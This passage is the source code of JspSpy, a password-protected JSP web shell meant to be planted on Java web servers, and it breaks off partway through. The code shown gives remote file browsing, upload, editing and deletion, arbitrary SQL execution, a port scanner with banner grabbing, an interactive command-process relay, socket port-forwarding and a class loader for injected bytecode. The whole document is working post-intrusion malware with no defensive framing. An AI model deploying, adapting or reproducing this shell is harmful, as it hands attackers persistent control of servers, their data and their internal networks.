<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
<jsp:directive.page contentType="text/html;charset=utf-8" pageEncoding="utf-8"/>
<jsp:directive.page import="java.io.*"/>
<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.util.regex.*"/>
<jsp:directive.page import="java.sql.*"/>
<jsp:directive.page import="java.lang.reflect.*"/>
<jsp:directive.page import="java.nio.charset.*"/>
<jsp:directive.page import="javax.servlet.http.HttpServletRequestWrapper"/>
<jsp:directive.page import="java.text.*"/>
<jsp:directive.page import="java.net.*"/>
<jsp:directive.page import="java.util.zip.*"/>
<jsp:directive.page import="java.util.jar.*"/>
<jsp:directive.page import="java.awt.*"/>
<jsp:directive.page import="java.awt.image.*"/>
<jsp:directive.page import="javax.imageio.*"/>
<jsp:directive.page import="java.awt.datatransfer.DataFlavor"/>
<jsp:directive.page import="java.util.prefs.Preferences"/>
<jsp:declaration><![CDATA[
private static final String PW = "xxxxxx"; //password
private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
private static final String REQUEST_CHARSET = "ISO-8859-1";
private static final String PAGE_CHARSET = "UTF-8";
private static final String CURRENT_DIR = "currentdir";
private static final String MSG = "SHOWMSG";
private static final String PORT_MAP = "PMSA";
private static final String DBO = "DBO";
private static final String SHELL_ONLINE = "SHELL_ONLINE";
private static final String ENTER = "ENTER_FILE";
private static final String ENTER_MSG = "ENTER_FILE_MSG";
private static final String ENTER_CURRENT_DIR  = "ENTER_CURRENT_DIR";
private static final String SESSION_O = "SESSION_O";
private static String SHELL_NAME = "";
private static String WEB_ROOT = null; 
private static String SHELL_DIR = null;
public static Map ins = new HashMap();
private static boolean ISLINUX = false;

private static final String MODIFIED_ERROR = "JspSpy Was Modified By Some Other Applications. Please Logout.";
private static final String BACK_HREF = " <a href='javascript:history.back()'>Back</a>";

private static class MyRequest extends HttpServletRequestWrapper {
public MyRequest(HttpServletRequest req) {
super(req);
}
public String getParameter(String name) {
try {
String value = super.getParameter(name);
if (name == null)
return null;
return new String(value.getBytes(REQUEST_CHARSET),PAGE_CHARSET);
} catch (Exception e) {
return null;
}
}
}
private static class SpyClassLoader extends ClassLoader{
public SpyClassLoader() {
}
public Class defineClass(String name,byte[] b) {
return super.defineClass(name,b,0,b.length - 2);
}
}
private static class DBOperator{
private Connection conn = null;
private Statement stmt = null;
private String driver;
private String url;
private String uid;
private String pwd;
public DBOperator(String driver,String url,String uid,String pwd) throws Exception {
this(driver,url,uid,pwd,false);
}
public DBOperator(String driver,String url,String uid,String pwd,boolean connect) throws Exception {
Class.forName(driver);
if (connect)
this.conn = DriverManager.getConnection(url,uid,pwd);
this.url = url;
this.driver = driver;
this.uid = uid;
this.pwd = pwd;
}
public void connect() throws Exception{
this.conn = DriverManager.getConnection(url,uid,pwd);
}
public Object execute(String sql) throws Exception {
if (isValid()) {
stmt = conn.createStatement();
if (stmt.execute(sql)) {
return stmt.getResultSet();
} else {
return ""+stmt.getUpdateCount();
}
}
throw new Exception("Connection is inValid.");
}
public void closeStmt() throws Exception{
if (this.stmt != null)
stmt.close();
}
public boolean isValid() throws Exception {
return conn != null && !conn.isClosed();
}
public void close() throws Exception {
if (isValid()) {
closeStmt();
conn.close();
}
}
public boolean equals(Object o) {
if (o instanceof DBOperator) {
DBOperator dbo = (DBOperator)o;
return this.driver.equals(dbo.driver) && this.url.equals(dbo.url) && this.uid.equals(dbo.uid) && this.pwd.equals(dbo.pwd);
}
return false;
}
public Connection getConn(){
return this.conn;
}
}
private static class StreamConnector extends Thread {
private InputStream is;
private OutputStream os;  
public StreamConnector( InputStream is, OutputStream os ){
this.is = is;
this.os = os;
}			  
public void run(){
BufferedReader in  = null;
BufferedWriter out = null;
try{
in  = new BufferedReader( new InputStreamReader(this.is));
out = new BufferedWriter( new OutputStreamWriter(this.os));
char buffer[] = new char[8192];
int length;
while((length = in.read( buffer, 0, buffer.length ))>0){
out.write( buffer, 0, length );
out.flush();
}
} catch(Exception e){}
try{
if(in != null)
in.close();
if(out != null)
out.close();
} catch( Exception e ){}
}
public static void readFromLocal(final DataInputStream localIn,final DataOutputStream remoteOut){
new Thread(new Runnable(){
public void run(){
while (true) {
try{
byte[] data = new byte[100];
int len = localIn.read(data);
while (len != -1) {
remoteOut.write(data,0,len);
len = localIn.read(data);
}
}catch (Exception e) {
break;
}
}
}
}).start();
}
public static void readFromRemote(final Socket soc,final Socket remoteSoc,final DataInputStream remoteIn,final DataOutputStream localOut){
new Thread(new Runnable(){
public void run(){
while(true) {
try{
byte[] data = new byte[100];
int len = remoteIn.read(data);
while (len != -1) {
localOut.write(data,0,len);
len = remoteIn.read(data);
}
}catch (Exception e) {
try{
soc.close();
remoteSoc.close();
}catch(Exception ex) {
}
break;
}
}
}
}).start();
}
}
private static class EnterFile extends File{
private ZipFile zf = null;
private ZipEntry entry = null;
private boolean isDirectory = false;
private String absolutePath = null;
public void setEntry(ZipEntry e) {
this.entry = e;
}
public void setAbsolutePath(String p) {
this.absolutePath = p;
}
public void close() throws Exception{
this.zf.close();
}
public void setZf(String p) throws Exception{
if (p.toLowerCase().endsWith(".jar"))
this.zf = new JarFile(p);
else 
this.zf = new ZipFile(p);
}
public EnterFile(File parent, String child) {
super(parent,child);
}
public EnterFile(String pathname) {
super(pathname);
}
public EnterFile(String pathname,boolean isDir) {
this(pathname);
this.isDirectory = isDir;
}
public EnterFile(String parent, String child) {
super(parent,child);
}
public EnterFile(URI uri) {
super(uri);
}
public boolean exists(){
return new File(this.zf.getName()).exists();
}
public File[] listFiles()  {
java.util.List list = new ArrayList();
java.util.List handled = new ArrayList();
String currentDir = super.getPath();
currentDir = currentDir.replace('\\','/');
if (currentDir.indexOf("/") == 0)
{
if (currentDir.length() > 1)
currentDir = currentDir.substring(1);
else 
currentDir = "";
}
Enumeration e = this.zf.entries();
while (e.hasMoreElements())
{
ZipEntry entry = (ZipEntry)e.nextElement();
String eName = entry.getName();
if (this.zf instanceof JarFile) {
if (!entry.isDirectory()){
EnterFile ef = new EnterFile(eName);
ef.setEntry(entry);
try{
ef.setZf(this.zf.getName());
}catch(Exception ex) {
}
list.add(ef);
}
} else {
if (currentDir.equals("")) {
//zip root directory
if (eName.indexOf("/") == -1 || eName.matches("[^/]+/$"))
{
EnterFile ef = new EnterFile(eName.replaceAll("/",""));
handled.add(eName.replaceAll("/",""));
ef.setEntry(entry);
list.add(ef);
} else {
if (eName.indexOf("/") != -1) {
String tmp = eName.substring(0,eName.indexOf("/"));
if (!handled.contains(tmp) && !Util.isEmpty(tmp)) {
EnterFile ef = new EnterFile(tmp,true);
ef.setEntry(entry);
list.add(ef);
handled.add(tmp);
}
}
}
} else {
if (eName.startsWith(currentDir)) {
if (eName.matches(currentDir+"/[^/]+/?$")) {
//file.
EnterFile ef = new EnterFile(eName);
ef.setEntry(entry);
list.add(ef);
if (eName.endsWith("/")) {
String tmp = eName.substring(eName.lastIndexOf('/',eName.length()-2));
tmp = tmp.substring(1,tmp.length()-1);
handled.add(tmp);
}
} else {
//dir
try {
String tmp = eName.substring(currentDir.length()+1);
tmp = tmp.substring(0,tmp.indexOf('/'));
if (!handled.contains(tmp) && !Util.isEmpty(tmp)) {
EnterFile ef = new EnterFile(tmp,true);
ef.setAbsolutePath(currentDir+"/"+tmp);
ef.setEntry(entry);
list.add(ef);
handled.add(tmp);
}
} catch (Exception ex) {
}
}
}
}
}
}
return  (File[])list.toArray(new File[0]);
}
public boolean isDirectory(){
return this.entry.isDirectory() || this.isDirectory;
}
public String getParent(){
return "";
}
public String getAbsolutePath(){
return absolutePath != null ? absolutePath : super.getPath();
}
public String getName(){
if (this.zf instanceof JarFile) {
return this.getAbsolutePath();
} else {
return super.getName();
}
}
public long lastModified(){
return entry.getTime();
}
public boolean canRead(){
return false;
}
public boolean canWrite(){
return false;
}
public boolean canExecute(){
return false;
}
public long length(){
return entry.getSize();
}
}
private static class OnLineProcess {
private String cmd = "first";
private Process pro;
public OnLineProcess(Process p){
this.pro = p;
}
public void setPro(Process p) {
this.pro = p;
}
public void setCmd(String c){
this.cmd = c;
}
public String getCmd(){
return this.cmd;
}
public Process getPro(){
return this.pro;
}
public void stop(){
this.pro.destroy();
}
}
private static class OnLineConnector extends Thread {
private OnLineProcess ol = null;
private InputStream is;
private OutputStream os;
private String name;
public OnLineConnector( InputStream is, OutputStream os ,String name,OnLineProcess ol){
this.is = is;
this.os = os;
this.name = name;
this.ol = ol;
}
public void run(){
BufferedReader in  = null;
BufferedWriter out = null;
try{
in  = new BufferedReader( new InputStreamReader(this.is));
out = new BufferedWriter( new OutputStreamWriter(this.os));
char buffer[] = new char[128];
if(this.name.equals("exeRclientO")) {
//from exe to client
int length = 0;
while((length = in.read( buffer, 0, buffer.length ))>0){
String str = new String(buffer, 0, length);
str = str.replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");
str = str.replaceAll(""+(char)13+(char)10,"<br/>");
str = str.replaceAll("\n","<br/>");
out.write(str.toCharArray(), 0, str.length());
out.flush();
}
} else {
//from client to exe
while(true) {
while(this.ol.getCmd() == null) {
Thread.sleep(500);
}
if (this.ol.getCmd().equals("first")) {
this.ol.setCmd(null);
continue;
}
this.ol.setCmd(this.ol.getCmd() + (char)10);
char[] arr = this.ol.getCmd().toCharArray();
out.write(arr,0,arr.length);
out.flush();
this.ol.setCmd(null);
}
}
} catch(Exception e){
}
try{
if(in != null)
in.close();
if(out != null)
out.close();
} catch( Exception e ){
}
}
}
private static class Table{
private ArrayList rows = null;
private boolean echoTableTag = false;
public void setEchoTableTag(boolean v) {
this.echoTableTag = v;
}
public Table(){
this.rows = new ArrayList();
}
public void addRow(Row r) {
this.rows.add(r);
}
public String toString(){
StringBuffer html = new StringBuffer();
if (echoTableTag)
html.append("<table>");
for (int i = 0;i<rows.size();i++) {
				Row r=(Row)rows.get(i);
html.append("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">");
				ArrayList columns = r.getColumns();
for (int a = 0;a<columns.size();a++) {
					Column c = (Column)columns.get(a);
html.append("<td nowrap>");
String vv = Util.htmlEncode(Util.getStr(c.getValue()));
if (vv.equals(""))
vv = "&nbsp;";
html.append(vv);
html.append("</td>");
}
html.append("</tr>");
}
if (echoTableTag)
html.append("</table>");
return html.toString();
}
public static String rs2Table(ResultSet rs,String sep,boolean op) throws Exception{
StringBuffer table = new StringBuffer();
ResultSetMetaData meta = rs.getMetaData();
int count = meta.getColumnCount();
if (!op)
table.append("<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\"javascript:doPost({o:'executesql'})\">View All Tables</a><br/><br/>");
else 
table.append("<b style='color:red;margin-left:15px'><i> All Tables </i></b><br/><br/>");
table.append("<script>function view(t){document.getElementById('sql').value='select * from "+sep+"'+t+'"+sep+"';}</script>");
table.append("<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\" style=\"margin-left:15px\"><tr class=\"head\">");
for (int i = 1;i<=count;i++) {
table.append("<td nowrap>"+meta.getColumnName(i)+"</td>");
}
if (op)
table.append("<td>&nbsp;</td>");
table.append("</tr>");
while (rs.next()) {
String tbName = null;
table.append("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">");
for (int i = 1;i<=count;i++) {
String v = rs.getString(i);
if (i == 3)
tbName = v;
table.append("<td nowrap>"+Util.null2Nbsp(v)+"</td>");
}
if (op)
table.append("<td nowrap> <a href=\"#\" onclick=\"view('"+tbName+"')\">View</a> | <a href=\"javascript:doPost({o:'executesql',type:'struct',table:'"+tbName+"'})\">Struct</a> | <a href=\"javascript:doPost({o:'export',table:'"+tbName+"'})\">Export </a> | <a href=\"javascript:doPost({o:'vExport',table:'"+tbName+"'})\">Save To File</a> </td>");
table.append("</tr>");
}
table.append("</table><br/>");
return table.toString();
}
}
private static class Row{
private ArrayList cols = null;
public Row(){
this.cols = new ArrayList();
}
public void addColumn(Column n) {
this.cols.add(n);
}
public ArrayList getColumns(){
return this.cols;
}
}
private static class Column{
private String value;
public Column(String v){
this.value = v;
}
public String getValue(){
return this.value;
}
}
private static class Util{
public static boolean isEmpty(String s) {
return s == null || s.trim().equals("");
}
public static boolean isEmpty(Object o) {
return o == null || isEmpty(o.toString());
}
public static String getSize(long size,char danwei) {
if (danwei == 'M') {
double v =  formatNumber(size / 1024.0 / 1024.0,2);
if (v > 1024) {
return getSize(size,'G');
}else {
return v + "M";
}
} else if (danwei == 'G') {
return formatNumber(size / 1024.0 / 1024.0 / 1024.0,2)+"G";
} else if (danwei == 'K') {
double v = formatNumber(size / 1024.0,2);
if (v > 1024) {
return getSize(size,'M');
} else {
return v + "K";
}
} else if (danwei == 'B') {
if (size > 1024) {
return getSize(size,'K');
}else {
return size + "B";
}
}
return ""+0+danwei;
}
public static boolean exists(String[] arr,String v) {
for (int i =0;i<arr.length;i++) {
if (v.equals(arr[i])) {
return true;
}
}
return false;
}
public static double formatNumber(double value,int l) {
NumberFormat format = NumberFormat.getInstance();
format.setMaximumFractionDigits(l);
format.setGroupingUsed(false);
return new Double(format.format(value)).doubleValue();
}
public static boolean isInteger(String v) {
if (isEmpty(v))
return false;
return v.matches("^\\d+$");
}
public static String formatDate(long time) {
SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
return format.format(new java.util.Date(time));
}
public static String convertPath(String path) {
return path != null ? path.replace('\\','/') : "";
}
public static String htmlEncode(String v) {
if (isEmpty(v))
return "";
return v.replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");
}
public static String getStr(String s) {
return s == null ? "" :s;
}
public static String null2Nbsp(String s) {
if (s == null)
s = "&nbsp;";
return s;
}
public static String getStr(Object s) {
return s == null ? "" :s.toString();
}
public static String exec(String regex, String str, int group) {
Pattern pat = Pattern.compile(regex);
Matcher m = pat.matcher(str);
if (m.find())
return m.group(group);
return null;
}
public static void outMsg(Writer out,String msg) throws Exception {
outMsg(out,msg,"center");
}
public static void outMsg(Writer out,String msg,String align) throws Exception {
out.write("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:"+align+";font-weight:bold;margin:10px\">"+msg+"</div>");
}
public static String highLight(String str) {
str = str.replaceAll("\\b(abstract|package|String|byte|static|synchronized|public|private|protected|void|int|long|double|boolean|float|char|final|extends|implements|throw|throws|native|class|interface|emum)\\b","<span style='color:blue'>$1</span>");
str = str.replaceAll("\t(//.+)","\t<span style='color:green'>$1</span>");
return str;
}
}
private static class UploadBean {
private String fileName = null;
private String suffix = null;
private String savePath = "";
private ServletInputStream sis = null;
private OutputStream targetOutput = null;
private byte[] b = new byte[1024];
public void setTargetOutput(OutputStream stream) {
this.targetOutput = stream;
}
public UploadBean() {
}
public void setSavePath(String path) {
this.savePath = path;
}
public String getFileName(){
return this.fileName;
}
public void parseRequest(HttpServletRequest request) throws IOException {
sis = request.getInputStream();
int a = 0;
int k = 0;
String s = "";
while ((a = sis.readLine(b,0,b.length))!= -1) {
s = new String(b, 0, a,PAGE_CHARSET);
if ((k = s.indexOf("filename=\""))!= -1) {
s = s.substring(k + 10);
k = s.indexOf("\"");
s = s.substring(0, k);
File tF = new File(s);
if (tF.isAbsolute()) {
fileName = tF.getName();
} else {
fileName = s;
}
k = s.lastIndexOf(".");
suffix = s.substring(k + 1);
upload();
}
}
}
private void upload() throws IOException{
try {
OutputStream out = null;
if (this.targetOutput != null) 
out = this.targetOutput;
else 
out = new FileOutputStream(new File(savePath,fileName));
int a = 0;
int k = 0;
String s = "";
while ((a = sis.readLine(b,0,b.length))!=-1) {
s = new String(b, 0, a);
if ((k = s.indexOf("Content-Type:"))!=-1) {
break;
}
}
sis.readLine(b,0,b.length);
while ((a = sis.readLine(b,0,b.length)) != -1) {
s = new String(b, 0, a);
if ((b[0] == 45) && (b[1] == 45) && (b[2] == 45) && (b[3] == 45) && (b[4] == 45)) {
break;
}
out.write(b, 0, a);
}
if (out instanceof FileOutputStream)
out.close();
} catch (IOException ioe) {
throw ioe;
}
}
}
]]></jsp:declaration>
<jsp:scriptlet><![CDATA[
SHELL_NAME = request.getServletPath().substring(request.getServletPath().lastIndexOf("/")+1);
String myAbsolutePath = application.getRealPath(request.getServletPath());
if (Util.isEmpty(myAbsolutePath)) {//for weblogic
SHELL_NAME = request.getServletPath();
myAbsolutePath = new File(application.getResource("/").getPath()+SHELL_NAME).toString();
SHELL_NAME=request.getContextPath()+SHELL_NAME;
WEB_ROOT = new File(application.getResource("/").getPath()).toString();
} else {
WEB_ROOT = application.getRealPath("/");
}
SHELL_DIR = Util.convertPath(myAbsolutePath.substring(0,myAbsolutePath.lastIndexOf(File.separator)));
if (SHELL_DIR.indexOf('/') == 0)
ISLINUX = true;
else
ISLINUX = false;
if (session.getAttribute(CURRENT_DIR) == null)
session.setAttribute(CURRENT_DIR,Util.convertPath(SHELL_DIR));
request = new MyRequest(request);
if (session.getAttribute(PW_SESSION_ATTRIBUTE) == null || !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) {
String o = request.getParameter("o");
if (o != null &&  o.equals("login")) {
((Invoker)ins.get("login")).invoke(request,response,session);
return;
} else if (o != null && o.equals("vLogin")) {
((Invoker)ins.get("vLogin")).invoke(request,response,session);
return;
} else {
((Invoker)ins.get("vLogin")).invoke(request,response,session);
return;
}
}
]]></jsp:scriptlet>
<jsp:declaration><![CDATA[
private static interface Invoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception;
public boolean doBefore();
public boolean doAfter();
}
private static class DefaultInvoker implements Invoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception {
}
public boolean doBefore(){
return true;
}
public boolean doAfter() {
return true;
}
}
private static class ScriptInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<script type=\"text/javascript\">"+
"	String.prototype.trim = function(){return this.replace(/^\\s+|\\s+$/,'');};"+
"	function fso(obj) {"+
"		this.currentDir = '"+JSession.getAttribute(CURRENT_DIR)+"';"+
"		this.filename = obj.filename;"+
"		this.path = obj.path;"+
"		this.filetype = obj.filetype;"+
"		this.charset = obj.charset;"+
"	};"+
"	fso.prototype = {"+
"		copy:function(){"+
"			var path = prompt('Copy To : ',this.path);"+
"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"+
"			doPost({o:'copy',src:this.path,to:path});"+
"		},"+
"		move:function() {"+
"			var path =prompt('Move To : ',this.path);"+
"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"+
"			doPost({o:'move',src:this.path,to:path})"+
"		},"+
"		vEdit:function() {"+
"			if (!this.charset)"+
"				doPost({o:'vEdit',filepath:this.path});"+
"			else"+
"				doPost({o:'vEdit',filepath:this.path,charset:this.charset});"+
"		},"+
"		down:function() {"+
"			doPost({o:'down',path:this.path})"+
"		},"+
"		removedir:function() {"+
"			if (!confirm('Dangerous ! Are You Sure To Delete '+this.filename+'?'))return;"+
"			doPost({o:'removedir',dir:this.path});"+
"		},"+
"		mkdir:function() {"+
"			var name = prompt('Input New Directory Name','');"+
"			if (name == null || name.trim().length == 0)return;"+
"			doPost({o:'mkdir',name:name});"+
"		},"+
"		subdir:function(out) {"+
"			doPost({o:'filelist',folder:this.path,outentry:(out || 'none')})"+
"		},"+
"		parent:function() {"+
"			var parent=(this.path.substr(0,this.path.lastIndexOf(\"/\")))+'/';"+
"			doPost({o:'filelist',folder:parent})"+
"		},"+
"		createFile:function() {"+
"			var path = prompt('Input New File Name','');"+
"			if (path == null || path.trim().length == 0) return;"+
"			doPost({o:'vCreateFile',filepath:path})"+
"		},"+
"		deleteBatch:function() {"+
"			if (!confirm('Are You Sure To Delete These Files?')) return;"+
"			var selected = new Array();"+
"			var inputs = document.getElementsByTagName('input');"+
"			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"+
"			if (selected.length == 0) {alert('No File Selected');return;}"+
"			doPost({o:'deleteBatch',files:selected.join(',')})"+
"		},"+
"		packBatch:function() {"+
"			var selected = new Array();"+
"			var inputs = document.getElementsByTagName('input');"+
"			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"+
"			if (selected.length == 0) {alert('No File Selected');return;}"+
"			var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');"+
"			if (savefilename == null || savefilename.trim().length == 0)return;"+
"			doPost({o:'packBatch',files:selected.join(','),savefilename:savefilename})"+
"		},"+
"		pack:function(showconfig) {"+
"			if (showconfig && confirm('Need Pack Configuration?')) {doPost({o:'vPack',packedfile:this.path});return;}"+
"			var tmpName = '';"+
"			if (this.filename.indexOf('.') == -1) tmpName = this.filename;"+
"			else tmpName = this.filename.substr(0,this.filename.lastIndexOf('.'));"+
"			tmpName += '.zip';"+
"			var path = this.path;"+
"			var name = prompt('Input Target File Name (Only Support Zip)',tmpName);"+
"			if (name == null || path.trim().length == 0) return;"+
"			doPost({o:'pack',packedfile:path,savefilename:name})"+
"		},"+
"		vEditProperty:function() {"+
"			var path = this.path;"+
"			doPost({o:'vEditProperty',filepath:path})"+
"		},"+
"		unpack:function() {"+
"			var path = prompt('unpack to : ',this.currentDir+'/'+this.filename.substr(0,this.filename.lastIndexOf('.')));"+
"			if (path == null || path.trim().length == 0) return;"+
"			doPost({o:'unpack',savepath:path,zipfile:this.path})"+
"		},"+
"		enter:function() {"+
"			doPost({o:'enter',filepath:this.path})"+
"		}"+
"	};"+
"	function doPost(obj) {"+
"		var form = document.forms[\"doForm\"];"+
"		var elements = form.elements;for (var i = form.length - 1;i>=0;i--){form.removeChild(elements[i])}"+
"		for (var pro in obj)"+
"		{"+
"			var input = document.createElement(\"input\");"+
"			input.type = \"hidden\";"+
"			input.name = pro;"+
"			input.value = obj[pro];"+
"			form.appendChild(input);"+
"		}"+
"		form.submit();"+
"	}"+
"</script>");	

} catch (Exception e) {

throw e ;
}
}
}
private static class BeforeInvoker extends  DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>JspSpy</title><style type=\"text/css\">"+
"body,td{font: 12px Arial,Tahoma;line-height: 16px;}"+
".input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}"+
".area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}"+
".bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}"+
"a {color: #00f;text-decoration:underline;}"+
"a:hover{color: #f00;text-decoration:none;}"+
".alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}"+
".alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}"+
".focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}"+
".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}"+
".head td span{font-weight:normal;}"+
"form{margin:0;padding:0;}"+
"h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}"+
"ul.info li{margin:0;color:#444;line-height:24px;height:24px;}"+
"u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}"+
".secho{height:400px;width:100%;overflow:auto;border:none}"+
"hr{border: 1px solid rgb(221, 221, 221); height: 0px;}"+
"</style></head><body style=\"margin:0;table-layout:fixed; word-break:break-all\">");
} catch (Exception e) {

throw e ;
}
}
}
private static class AfterInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("</body></html>");
} catch (Exception e) {

throw e ;
}
}
}
private static class DeleteBatchInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String files = request.getParameter("files");
int success = 0;
int failed = 0;
if (!Util.isEmpty(files)) {
String currentDir = JSession.getAttribute(CURRENT_DIR).toString();
String[] arr = files.split(",");
for (int i = 0;i<arr.length;i++) {
							String fs = arr[i];
File f = new File(currentDir,fs);
if(f.delete())
success += 1;
else
failed += 1;
}
}
JSession.setAttribute(MSG,success+" Files Deleted <span style='color:green'>Success</span> , "+failed+" Files Deleted <span style='color:red'>Failed</span>!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
private static class ClipBoardInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td>"+
"        <h2>System Clipboard &raquo;</h2>"+
"<p><pre>");
try{
out.println(Util.htmlEncode(Util.getStr(Toolkit.getDefaultToolkit().getSystemClipboard().getContents(DataFlavor.stringFlavor).getTransferData(DataFlavor.stringFlavor))));
}catch (Exception ex) {
out.println("ClipBoard is Empty Or Is Not Text Data !");
}
out.println("</pre>"+
"          <input class=\"bt\" name=\"button\" id=\"button\" onClick=\"history.back()\" value=\"Back\" type=\"button\" size=\"100\"/>"+
"        </p>"+
"      </td>"+
"  </tr>"+
"</table>");
} catch (Exception e) {

throw e ;
}
}
}
private static class VPortScanInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String ip = request.getParameter("ip");
String ports = request.getParameter("ports");
String timeout = request.getParameter("timeout");
String banner = request.getParameter("banner");
if (Util.isEmpty(ip))
ip = "127.0.0.1";
if (Util.isEmpty(ports))
ports = "21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500";
if (Util.isEmpty(timeout)) 
timeout = "2";
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
"<div id=\"YwLB\"><form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<p><input type=\"hidden\" value=\"portScan\" name=\"o\"/>"+
"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> <input "+(!Util.isEmpty(banner) ? "checked" : "")+" type='checkbox' value='yes' name='banner'/>Banner Timeout  (Second) : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
"</p>"+
"</form></div>"+
"</td></tr></table>");
} catch (Exception e) {

throw e ;
}
}
}
private static class PortScanInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
((Invoker)ins.get("vPortScan")).invoke(request,response,JSession);
out.println("<hr/>");
String ip = request.getParameter("ip");
String ports = request.getParameter("ports");
String timeout = request.getParameter("timeout");
String banner = request.getParameter("banner");
int iTimeout = 0;
if (Util.isEmpty(ip) || Util.isEmpty(ports))
return;
if (!Util.isInteger(timeout)) {
timeout = "2";
}
iTimeout = Integer.parseInt(timeout);
Map rs = new LinkedHashMap();
String[] portArr = ports.split(",");
for (int i =0;i<portArr.length;i++) {
						String port = portArr[i];
BufferedReader r = null;
try {
Socket s = new Socket();
s.connect(new InetSocketAddress(ip,Integer.parseInt(port)),iTimeout);
s.setSoTimeout(iTimeout);
if (!Util.isEmpty(banner)) {
r = new BufferedReader(new InputStreamReader(s.getInputStream()));
StringBuffer sb = new StringBuffer();
String b = r.readLine();
while (b != null) {
sb.append(b+" ");
try {
b = r.readLine();
} catch (Exception e) {
break;
}
}
rs.put(port,"Open <span style=\"color:grey;font-weight:normal\">"+sb.toString()+"</span>");
r.close();
} else {
rs.put(port,"Open");
}
s.close();
} catch (Exception e) {
if (e.toString().toLowerCase().indexOf("read timed out")!=-1) {
rs.put(port,"Open <span style=\"color:grey;font-weight:normal\">&lt;&lt;No Banner!&gt;&gt;</span>");
if (r != null)
r.close();
} else {
rs.put(port,"Close");
}
}
}
out.println("<div style='margin:10px'>");
Set entrySet = rs.entrySet();
					Iterator it =  entrySet.iterator();
					while (it.hasNext()) {
						Map.Entry e = (Map.Entry)it.next();
						String port = (String)e.getKey();
						String value = (String)e.getValue();
out.println(ip+" : "+port+" ................................. <font color="+(value.equals("Close")?"red":"green")+"><b>"+value+"</b></font><br>");
}
out.println("</div>");
} catch (Exception e) {

throw e ;
}
}
}
private static class VConnInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
Object obj = JSession.getAttribute(DBO);
if (obj == null || !((DBOperator)obj).isValid()) {
out.println("  <script type=\"text/javascript\">"+
"	function changeurldriver(){"+
"		var form = document.forms[\"form1\"];"+
"		var v = form.elements[\"db\"].value;"+
"		form.elements[\"url\"].value = v.split(\"`\")[1];"+
"		form.elements[\"driver\"].value = v.split(\"`\")[0];"+
